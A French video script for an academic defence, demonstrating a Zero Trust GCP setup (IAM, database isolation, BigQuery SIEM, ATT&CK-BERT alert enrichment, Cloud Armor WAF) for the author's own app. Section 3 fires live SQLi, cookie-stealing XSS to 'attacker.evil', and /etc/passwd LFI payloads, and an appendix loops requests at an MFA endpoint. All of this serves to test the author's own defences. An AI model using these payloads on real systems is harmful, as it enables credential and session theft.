# Script vidéo soutenance — ≈5:00 à 5:15, un seul enregistrement continu

> **Rôle de ce document** : c'est une feuille de régie, pas un script que quelqu'un
> d'autre exécute pour vous. **Vous manipulez** — clavier, souris, terminal, navigateur.
> Ce document vous dit, seconde par seconde, quoi taper, quoi cliquer, et quoi dire.
>
> **Ordre imposé** : d'abord un tour technique en direct de ce qui protège et personnalise
> réellement Elson (IAM, isolation base de données, BigQuery/SIEM, **enrichissement ML
> ATT&CK-BERT**, MFA) — puis l'attaque en direct, lancée seulement une fois le terrain posé.
> Rien de Terraform à l'écran : uniquement l'état réel du cloud, interrogé en direct
> (`gcloud`, `bq`, `curl`, le dashboard). Orientation délibérément technique.
>
> **Couverture HLD/LLD** : ce tour couvre L2 (IAM), L4/L5 (réseau/données via l'isolation),
> L5 (SIEM BigQuery) et **L6 (ML/ATT&CK-BERT, le point d'originalité explicitement cité au
> HLD §4.1)**. Le rate limiting L1, le détail JWT-RBAC visuel, WIF et le pipeline DevSecOps
> restent hors cadre par choix de temps — préparer une réponse orale si le jury les demande
> (voir `04_EXPLOITATION_DEMO.md` Acte 2 et Acte 3 pour rejouer ces points séparément si besoin).
>
> Dérivé de `04_EXPLOITATION_DEMO.md` (référence complète, ≈12-15 min).

## STATUT ACTUEL — armé et prêt à filmer (11/08/2026, ~03:06 UTC)

Toutes les commandes ci-dessous ont été rejouées et vérifiées en direct aujourd'hui, dans
l'ordre de ce script :

| Segment | Vérifié en direct | Résultat réel |
|---|---|---|
| IAM Elson | ✅ | `sa-elson-staging@...` → exactement `cloudsql.client` + `logging.logWriter`, rien d'autre au niveau projet |
| Isolation DB Elson/MENAL | ✅ (job relancé à l'instant) | 6/6 vérifications `ok`, `isolated: true` |
| BigQuery — trafic Elson dans le SIEM | ✅ | 11 requêtes `service="elson-api-staging"` dans `access_logs`, dernière heure |
| ML — ATT&CK-BERT (enrichissement sémantique) | ✅ | mapping réel `T1003.008` (Credential Access) à similarité 0.684, `attack-bert-onnx-fp32@v1.0`, 03:16:46 UTC |
| Attaque SQLi/XSS/LFI sur Elson | ✅ (rafraîchi à 02:57:41) | 403 sur les trois, journaux Cloud Armor corroborants |
| Détection SIEM R2 (pic WAF) | ✅ **fraîche** | dernière ligne insérée **03:06:01 UTC** (~8 min après l'envoi), visible dans le dashboard maintenant |

Rien dans ce document n'est une promesse non vérifiée. Voir l'annexe finale « Ce qui est
réellement temps réel » avant de répondre à une question du jury sur ce sujet.

**Fenêtre de tournage confortable : maintenant jusqu'à environ 03:45 UTC** (avant que la
ligne dépasse ~40 min et redevienne visuellement datée). Au-delà, relancer la vague de la §3
une fois de plus, 10-15 min avant de filmer.

> ⚠️ **Toutes les données ci-dessus datent du 11/08/2026** — avant de filmer, rejouer chaque
> commande pour obtenir des horodatages frais (le principe du script : rien de pré-calculé à
> l'écran). Depuis, 8 sessions d'audit/correction/déploiement (18-19/08) ont ajouté de
> nouvelles preuves techniques fortes — voir l'annexe « Preuves complémentaires (19/08) » en
> fin de document, à intégrer si vous tournez une version plus longue ou pour répondre aux
> questions du jury sur MFA/IAM/CI.

---

## 0. Check-list avant d'enregistrer (2 min, hors vidéo)

```bash
gcloud config set project menal-zero-trust-staging
export API=https://api-staging.menal-sarl.com
export ELSON=https://elson.menal-sarl.com
export DASH=https://dashboard.menal-sarl.com   # URL "production" ; si bascule non faite, utiliser https://dash-staging.menal-sarl.com

curl -s -o /dev/null -w 'menal  -> %{http_code}\n' $API/health
curl -s -o /dev/null -w 'elson  -> %{http_code}\n' $ELSON/api/health
curl -s -o /dev/null -w 'dash   -> %{http_code}\n' $DASH/login
```

- Terminal en police **16 pt minimum**, thème contrasté, fenêtre plein écran.
- Fermer tout ce qui affiche `$MENAL_PW` ou un token en clair.
- Se connecter une première fois au dashboard **avant** l'enregistrement (cold start du
  login) — ne pas rejouer cette connexion à l'écran.
- La détection R2 de la §4 est déjà armée (voir tableau ci-dessus). Si plus de ~40 min se
  sont écoulées depuis 00:41 UTC au moment de tourner, relancer la vague d'attaque de la §3
  une fois 10-15 min avant l'enregistrement pour rafraîchir l'horodatage affiché.

---

## 1. Accroche — le problème (0:00–0:20)

**À l'écran** : schéma d'architecture (section 2 de `04_EXPLOITATION_DEMO.md`) ou logo Elson.

**Narration :**
> « Elson est une application réelle : des contributeurs mauritaniens y enregistrent leur
> voix et traduisent des phrases pour construire des modèles de langue arabe hassaniya. Des
> données sensibles — voix, identifiant national — sans pare-feu applicatif à elle. Avant de
> l'attaquer, je vais vous montrer ce qui la protège concrètement, une couche à la fois. »

---

## 2. Tour technique en direct — ce qui protège et personnalise Elson (0:20–2:25)

**Vous manipulez le terminal.** Chaque commande est réelle, interroge l'infrastructure en
direct — rien n'est pré-calculé ni affiché depuis un fichier Terraform.

### 2.1 IAM — le compte de service d'Elson (0:20–0:45)

```bash
gcloud iam service-accounts list --project=menal-zero-trust-staging \
  --format="table(email,displayName)" | grep elson

gcloud projects get-iam-policy menal-zero-trust-staging --format=json \
  | python3 -c "import json,sys; p=json.load(sys.stdin)
[print(b['role']) for b in p['bindings'] if any('elson' in m for m in b['members'])]"
```

**Résultat attendu (vérifié à l'instant)** :
```
sa-elson-staging@menal-zero-trust-staging.iam.gserviceaccount.com
roles/cloudsql.client
roles/logging.logWriter
```

**À dire** : « Le compte de service d'Elson a exactement deux rôles au niveau projet — se
connecter à Cloud SQL et écrire des logs. Aucun accès à BigQuery : une application hébergée
ne lit jamais le SIEM qui la surveille. »

### 2.2 Isolation base de données — prouvée, pas déclarée (0:45–1:15, marge probable jusqu'à 1:25)

> **Risque de timing** : `gcloud run jobs execute --wait` a un vrai cold start (mesuré
> ailleurs sur ce socle : 27s en moyenne, jusqu'à 94s au pic). 30s peut être court. Si le job
> traîne, continuez à parler du *pourquoi* (revoir le texte « À dire » ci-dessous) pendant
> l'attente plutôt que de laisser un silence — le timing de l'annexe absorbe déjà un peu de
> marge en aval.

```bash
gcloud run jobs execute elson-sql-isolation-check-staging \
  --region=europe-west1 --project=menal-zero-trust-staging --wait

gcloud logging read 'resource.labels.job_name="elson-sql-isolation-check-staging"
  AND jsonPayload.message="SQL_ISOLATION_CHECK"' \
  --project=menal-zero-trust-staging --limit=1 --freshness=5m --format=json
```

**Résultat attendu (vérifié à l'instant)** : `isolated: true`, 6/6 `ok`, avec la ligne clé
`"tentative de connexion reelle elson_user -> menal_db rejetee"`.

**À dire** : « Ce job tourne tous les jours à 4h UTC et je viens de le relancer en direct —
il tente réellement une connexion croisée `elson_user → menal_db` et confirme son rejet. Ce
n'est pas un schéma qu'on affirme respecter, c'est une connexion réellement essayée et
refusée, à l'instant. »

### 2.3 BigQuery — le trafic Elson arrive vraiment dans le SIEM (1:15–1:35)

```bash
bq query --use_legacy_sql=false \
"SELECT service, COUNT(*) AS requetes
 FROM \`menal-zero-trust-staging.menal_security_staging.access_logs\`
 WHERE timestamp >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 60 MINUTE)
   AND service LIKE '%elson%'
 GROUP BY service"
```

**Résultat attendu** : une ligne `elson-api-staging` avec un nombre de requêtes non nul.
(Note pour vous : ce nom vient de Cloud Run. En §4, la même détection réapparaîtra sous
`menal-elson-api-backend-staging` — c'est le nom du *backend service* du load balancer, pas
du service Cloud Run. Les deux désignent la même application, vus par deux couches
différentes ; si le jury le relève, c'est la réponse.)

**À dire** : « Les mêmes tables BigQuery, les mêmes sept règles de détection Sigma que pour
MENAL — aucun jeu de règles séparé à maintenir pour chaque application du socle. »

### 2.4 Couche ML — enrichissement sémantique ATT&CK-BERT (1:35–2:05, le segment le plus dense)

> **Risque de timing** : c'est le point conceptuellement le plus chargé (similarité cosinus,
> logique de seuil, lien F6 livraison↔détection) sur le temps le plus court. Répéter cette
> réplique à voix haute au moins une fois avant l'enregistrement pour la caler sous 30s, ou
> accepter de déborder légèrement sur la marge de §2.2/§2.3 plutôt que de la débiter trop vite.

**Le point d'originalité de l'architecture**, cité tel quel au HLD §4.1 : chaque détection
brute est encodée par un vrai modèle de langage et rapprochée des techniques MITRE réelles
— pas un LLM génératif, une sortie déterministe et donc auditable.

```bash
bq query --use_legacy_sql=false \
"SELECT timestamp, model_version, similarity, status, tactic, technique_id
 FROM \`menal-zero-trust-staging.menal_security_staging.alert_enrichment\`
 WHERE status = 'mapped'
 ORDER BY timestamp DESC LIMIT 1"
```

**Résultat réel obtenu (vérifié à l'instant, 11/08/2026 03:16:46 UTC)** :
```
model_version: attack-bert-onnx-fp32@v1.0
similarity:    0.684
status:        mapped
tactic:        Credential Access
technique_id:  T1003.008
```

**À dire** : « Cette détection a été rapprochée par similarité cosinus de la technique
MITRE T1003.008 — vol d'identifiants — avec un score de 0,68, par le vrai modèle
ATT&CK-BERT exporté en ONNX, tournant sur ce cluster maintenant. En dessous d'un seuil de
0,60, on assume l'absence de rattachement plutôt que d'inventer une correspondance — un
choix de rigueur, pas un manque. C'est ce qui relie ma chaîne de livraison à ma détection :
aucun autre composant de l'architecture ne fait ce rapprochement. »

> **Écart assumé, à connaître si le jury compare au HLD** : le HLD (ADR-05) vise une
> quantisation **int8** pour ce modèle. En pratique, l'export int8 a été testé et **rejeté**
> par un gate de qualité (0/5 en accord de classement top-1 MITRE vs le modèle de référence
> float32) — c'est le `fp32` affiché ci-dessus, écart documenté dans
> `02_SECURITE_AUDITS_ECARTS.md`, pas un oubli. Bon exemple à citer si demandé : « la cible
> était int8, le gate qualité l'a rejetée, on a gardé fp32 — le garde-fou a joué son rôle. »

### 2.5 MFA — le point honnête (2:05–2:25)

**Pas de commande** — point parlé, pas de terminal.

**À dire** : « Un point à assumer maintenant, pas à cacher : Elson elle-même n'a aujourd'hui
aucun MFA, ni pour ses utilisateurs ni pour ses administrateurs. Le compte SOC MENAL, lui,
impose un TOTP à la connexion. C'est un axe d'amélioration identifié, pas un secret. Les
attaques que je vais lancer maintenant ne testent pas l'authentification — elles ciblent le
périmètre réseau, avant même d'atteindre un formulaire de connexion. »

---

## 3. Attaque en direct — tentative de vol de données (2:25–3:40)

**À l'écran** : terminal plein écran, exécution en direct.

```bash
echo "1) Vol d'identifiants — injection SQL sur /api/users"
curl -s -o /dev/null -w 'SQLi (dump identifiants) -> HTTP %{http_code}\n' \
  "$ELSON/api/users?search=x%27%20UNION%20SELECT%20email%2Cpassword_hash%20FROM%20users--%20-"

echo "2) Vol de session — XSS exfiltrant le cookie vers un domaine externe"
curl -s -o /dev/null -w 'XSS (vol de cookie)      -> HTTP %{http_code}\n' \
  "$ELSON/api/phrases?q=%3Cscript%3Efetch('https://attacker.evil/steal?c='%2Bdocument.cookie)%3C/script%3E"

echo "3) Reconnaissance système — lecture de fichier local"
curl -s -o /dev/null -w 'LFI (/etc/passwd)        -> HTTP %{http_code}\n' \
  "$ELSON/api/media?f=../../../etc/passwd"

echo "4) Référence — une requête légitime, pour comparaison"
curl -s -o /dev/null -w 'Requete legitime          -> HTTP %{http_code}\n' \
  "$ELSON/api/health"
```

**Attendu à l'écran (déjà vérifié) : `403`, `403`, `403`, `200`.**

**Narration pendant l'exécution :**
> « Trois attaques, trois objectifs — voler des identifiants, voler une session, lire le
> système de fichiers. Contre l'application dont je viens de vous montrer les protections.
> Toutes les trois, bloquées. »

> **Nuance à connaître, pas à dire mot pour mot à l'écran (trop long)** : ces charges testent
> la signature du WAF en périmètre — la couche qui doit arrêter ce type de motif quelle que
> soit l'application derrière — pas une vulnérabilité applicative précise et confirmée dans
> le code d'Elson. Si le jury demande « avez-vous vérifié que ces routes existent vraiment
> chez Elson avec ces paramètres ? » : « Le test porte sur la reconnaissance de la charge par
> Cloud Armor, indépendamment du code applicatif en aval — c'est justement l'intérêt d'un
> WAF au périmètre : il protège même les routes que je n'ai pas auditées une par une. »

**Preuve — journaux Cloud Armor, en direct :**

```bash
gcloud logging read 'resource.type="http_load_balancer"
  AND httpRequest.requestUrl:"elson.menal-sarl.com/api"
  AND jsonPayload.enforcedSecurityPolicy.outcome="DENY"' \
  --project=menal-zero-trust-staging \
  --limit=3 --freshness=2m \
  --format="table(jsonPayload.enforcedSecurityPolicy.priority,
                  jsonPayload.enforcedSecurityPolicy.outcome,
                  httpRequest.requestUrl,
                  httpRequest.status)"
```

**Résultat réel obtenu au test de préparation (11/08/2026)** :

| Priorité | Politique | Verdict | Requête | Statut |
|---|---|---|---|---|
| 1100 | `menal-api-waf-staging` | DENY | SQLi `/api/users?search=...UNION SELECT...` | 403 |
| 1000 | `menal-api-waf-staging` | DENY | XSS `/api/phrases?q=<script>...document.cookie` | 403 |
| 1200 | `menal-api-waf-staging` | DENY | LFI `/api/media?f=../../../etc/passwd` | 403 |

**À dire** : « La colonne priorité dit quelle règle a statué — 1000 à 1400, le WAF OWASP de
Cloud Armor. `DENY`, c'est le verdict du périmètre, pas de l'application. Ces attaques n'ont
jamais atteint le conteneur Elson, jamais atteint la base dont je viens de prouver
l'isolation. »

---

## 4. Le SOC voit l'attaque — dashboard en direct (3:40–4:30)

**À l'écran** : navigateur, `https://dashboard.menal-sarl.com/detections` puis
`/incidents`, déjà connecté. *(URL « production » — si la bascule DNS+cert n'est pas faite,
utiliser `https://dash-staging.menal-sarl.com`.)*

**Narration :**
> « Ces attaques ne sont pas juste bloquées, elles sont détectées et documentées. La règle
> "pic de blocages WAF" — plus de dix requêtes rejetées depuis la même IP en quinze minutes —
> a déclenché une détection, cartographiée MITRE ATT&CK T1498, tactique Impact. »

**Confirmé en préparation (11/08/2026)** — deux détections R2 réellement atterries en
BigQuery, à deux passages distincts :

```json
[
  {
    "rule_id": "R2", "entity": "41.188.115.195", "timestamp": "2026-08-11 00:41:07",
    "message": "12 requetes bloquees par Cloud Armor depuis 41.188.115.195 en 15 min",
    "mitre_tactic": "TA0040", "mitre_technique": "T1498",
    "service": "menal-elson-api-backend-staging"
  },
  {
    "rule_id": "R2", "entity": "41.188.115.195", "timestamp": "2026-08-11 00:21:09",
    "message": "12 requetes bloquees par Cloud Armor depuis 41.188.115.195 en 15 min",
    "mitre_tactic": "TA0040", "mitre_technique": "T1498",
    "service": "menal-elson-api-backend-staging"
  }
]
```

**Délai réellement observé** : ~5-6 min entre le franchissement du seuil et l'apparition de
la ligne — cycle d'exécution Sigma (5 min) + normalisation des journaux. Si la ligne affichée
date de plus d'une heure au moment du tournage, basculer sur le repli **Logs API** (filtré
`elson-api-staging`) qui montre les requêtes bloquées en quelques secondes, et dire :

> « La détection agrégée met quelques minutes à apparaître — le temps réel du pipeline. La
> preuve immédiate, elle, est là : chaque requête est journalisée à la seconde où elle
> arrive. »

---

## 5. Clôture — ce qui est prouvé, ce qui reste à faire (4:30–5:05)

**À l'écran** : texte simple, pas de terminal.

**Narration :**
> « Tout ce que vous venez de voir était réel : l'IAM, l'isolation de base de données, le
> trafic dans le SIEM, l'enrichissement ML, l'attaque, les blocages, la détection. Ce que
> j'assume aussi : Elson elle-même n'a aujourd'hui aucun MFA, et l'isolation entre
> applications dans le SIEM est partielle, pas totale — documenté plutôt que caché. C'est ce
> niveau de rigueur, prouver plutôt qu'affirmer, qui a guidé tout le développement de MENAL. »

**Fin.**

---

## Annexe — minutage strict

| Temps | Séquence |
|---|---|
| 0:00–0:20 | Accroche / problème |
| 0:20–2:25 | Tour technique Elson : IAM → isolation DB → BigQuery → **ML ATT&CK-BERT** → MFA |
| 2:25–3:40 | Attaque live + preuve journaux |
| 3:40–4:30 | Dashboard SOC |
| 4:30–5:05 | Clôture honnête |

**Règle d'or pendant l'enregistrement** : ne jamais s'arrêter pour corriger une erreur de
frappe — couper et reprendre le plan plutôt que de laisser un blanc. Toutes les commandes de
ce script sont pré-testées ; copier-coller telles quelles.

---

## Annexe — Ce qui est réellement temps réel

| Élément | Temps réel ? | Détail mesuré |
|---|---|---|
| IAM, isolation DB, BigQuery (§2) | **Oui, instantané.** | Chaque commande interroge l'état réel du cloud à l'instant où elle est lancée. |
| Envoi de l'attaque (§3) | **Oui, instantané.** | Aucune donnée pré-calculée. |
| Blocage Cloud Armor (`403`) | **Oui, instantané.** | Réponse en quelques centaines de ms, vrai verdict WAF. |
| Journal Cloud Armor (`gcloud logging read`) | **Oui, quasi instantané.** | Visible en général en moins de 30 s. |
| Ligne agrégée `detections` (règle R2) | **Réel, mais pas instantané.** | ~5-6 min mesurés deux fois (00:16→00:21:09, puis 00:35→00:41:07). |
| Affichage dashboard SOC | **Reflet direct de BigQuery.** | Apparaît dès que la ligne existe côté base. |

**Phrase prête à l'emploi si le jury demande si c'est « vraiment temps réel »** :
> « Le tour d'infrastructure et l'attaque sont en direct, seconde par seconde. La détection
> agrégée que vous voyez dans le dashboard a mis environ cinq minutes à être traitée par le
> pipeline — je l'ai déclenchée un peu avant cette prise pour ne pas vous faire attendre à
> l'écran. C'est une latence réelle et mesurée, pas cachée : le cycle d'analyse Sigma tourne
> toutes les cinq minutes, c'est un choix d'ingénierie documenté, pas une improvisation. »

---

## Annexe — Questions pièges anticipées (revue à deux jurys du 11/08/2026)

Trois questions qu'un jury exigeant posera probablement, avec réponse prête plutôt qu'à
improviser :

**Q1 — « Votre séparation MENAL/Elson dans le SIEM, "partielle" — partielle comment,
chiffrée ? »**
> « La colonne qui identifie le tenant est peuplée à 100 % sur la règle de force brute
> (R1), mais 75 à 90 % NULL sur les règles de traversée de chemin, d'injection et de pic WAF
> (R2/R3/R6) — et totalement absente sur deux tables, `api_metrics` et `alert_enrichment`.
> Conséquence concrète : les tuiles "vue d'ensemble" du dashboard mélangent le trafic des
> deux applications sans possibilité de les reséparer après coup. Chiffré et tracé dans
> `04_EXPLOITATION_DEMO.md`, pas juste estimé. »

**Q2 — « L'isolation IAM que vous montrez en §2.2 est-elle couverte par un test automatisé
en continu, ou seulement par ce job que vous relancez manuellement pour la vidéo ? »**
> « Le job tourne automatiquement tous les jours à 4h UTC — ce n'est pas seulement pour la
> démo. Ce qui est un vrai gap, que j'assume : le test end-to-end censé vérifier qu'un compte
> MENAL ne peut pas lire un secret Elson porte en réalité sur un secret MENAL, pas Elson — sa
> description ne correspond pas à son implémentation. L'isolation est correcte par
> construction Terraform et vérifiée chaque jour côté base de données, mais pas verrouillée
> par un test automatisé dédié à ce cas précis. »

**Q3 — « Pourquoi Elson n'a toujours aucun MFA après son intégration sur un socle qui se
revendique Zero Trust ? »**
> « Le HLD place explicitement le code applicatif d'Elson hors du périmètre du PFE (§1.2) —
> le socle expose les prérequis Zero Trust (réseau, IAM, secrets, détection), mais l'ajout du
> MFA côté application relève d'un chantier propre à Elson, pas du socle d'hébergement. C'est
> une limite de périmètre assumée dès la conception, pas un oubli découvert après coup. »

---

## Annexe — Preuves complémentaires (19/08/2026)

8 sessions d'audit/correction/déploiement entre le 18 et le 19/08 ont ajouté des preuves
techniques nouvelles, toutes vérifiées en conditions réelles (pas seulement en code) — détail
complet dans `02_SECURITE_AUDITS_ECARTS.md` §7-8. À intégrer si vous tournez une version plus
longue du technique, ou en réserve pour une question du jury.

### A1 — IAM : le service ML n'a plus aucun accès aux données

Avant le 19/08, `ml-embed` (le service qui encode les alertes pour ATT&CK-BERT) tournait sous
la même identité que le moteur de règles SIEM (`sa-pipeline`), qui avait un droit d'écriture
sur **tout** BigQuery au niveau projet — un service qui ne fait qu'encoder du texte pouvait
techniquement écrire dans les preuves du SIEM. Corrigé et vérifié en direct :

```bash
gcloud iam service-accounts list --project=menal-zero-trust-staging --format="table(email)" | grep ml-embed

gcloud projects get-iam-policy menal-zero-trust-staging --format=json \
  | python3 -c "import json,sys; p=json.load(sys.stdin)
[print(b['role']) for b in p['bindings'] if any('ml-embed' in m for m in b['members'])]"
```

**Résultat attendu** : `sa-ml-embed@...` avec un seul rôle, `roles/logging.logWriter` — rien
d'autre, aucun accès BigQuery.

**À dire** : « Même principe que pour Elson en §2.1 — une identité dédiée par composant, jamais
partagée. Le service ML n'a strictement aucun moyen d'écrire ou de lire les preuves qu'il
enrichit. »

### A2 — MFA : chiffré au repos, et le rate-limit est réellement appliqué

```bash
for i in $(seq 1 11); do
  curl -s -o /dev/null -w "requete $i -> %{http_code}\n" -X POST \
    "$API/auth/mfa/verify" -H "Content-Type: application/json" -d '{}'
done
```

**Résultat attendu** : `422` sur les 10 premières (validation normale), **`429`** sur la 11ᵉ —
le rate-limit Cloud Armor sur l'endpoint MFA se déclenche réellement, pas seulement en théorie.

**À dire** : « Le code à 6 chiffres d'un TOTP est brute-forçable sans protection dédiée — voici
la preuve que la 11ᵉ tentative en une minute est bloquée, pas juste documentée comme telle. Le
secret lui-même est chiffré en base depuis cette semaine, plus jamais stocké en clair. »

### A3 — Logs de deny réseau : la visibilité forensique existe enfin

```bash
gcloud logging read 'resource.type="gce_subnetwork" AND jsonPayload.disposition="DENIED"' \
  --project=menal-zero-trust-staging --limit=3 --freshness=1h
```

**À dire** : « Ces logs étaient absents jusqu'à cette semaine — un mouvement latéral interne
refusé par le pare-feu ne laissait aucune trace. Maintenant si. »

### A4 — CI/CD : une gate de sécurité cassée, trouvée, réparée, et sa preuve la plus forte

**Le meilleur point de démonstration de tout ce document**, parce qu'il ne se contente pas de
dire "c'est corrigé" — il montre la boucle complète : trouver, corriger, et voir le correctif
prouver sa propre valeur en direct.

La gate SAST (analyse statique, Semgrep) du pipeline CI **crashait silencieusement sur chaque
run depuis au moins deux semaines** (incompatibilité de version), sans jamais faire échouer le
pipeline — 0 règle de sécurité réellement évaluée malgré une porte annoncée "bloquante" dans le
YAML. Trouvé en inspectant les logs réels des runs GitHub Actions, pas en relisant la
configuration.

Corrigé et poussé en Pull Request (#17). **Résultat du premier run CI réel** :

```
Ran 612 rules on 438 files: 74 findings.
Process completed with exit code 1.
```

La CI est **rouge** sur cette PR — et c'est la preuve que le correctif marche : pour la première
fois en deux semaines, la gate bloque pour de vraies raisons, pas parce qu'elle crashe. Parmi
les 74 findings, un vrai problème de sécurité qui dormait invisible : la vérification du
certificat TLS est désactivée (`rejectUnauthorized: false`) sur plusieurs connexions à la base
de données Elson — chiffré en transit, mais sans authentifier le serveur. Décision assumée :
ne pas corriger les 74 findings à l'aveugle pour "faire joli" avant la vidéo — ils sont
documentés (`02_SECURITE_AUDITS_ECARTS.md` §9) pour une session de triage dédiée.

**À dire, si le jury demande "comment savez-vous que vos contrôles fonctionnent vraiment ?"** :
« Justement — un de mes contrôles ne fonctionnait pas et l'affichage disait le contraire. Je ne
l'ai découvert qu'en testant le comportement réel, pas en relisant le YAML. Et la preuve qu'il
fonctionne maintenant, c'est que la Pull Request est actuellement rouge : la gate a trouvé
74 vrais findings, dont un contournement de la vérification TLS jamais vu jusqu'ici. Je ne l'ai
pas corrigé en vitesse pour arriver ici avec une CI verte — je préfère vous montrer une gate
qui marche vraiment plutôt qu'une CI verte qui ne prouve rien. »
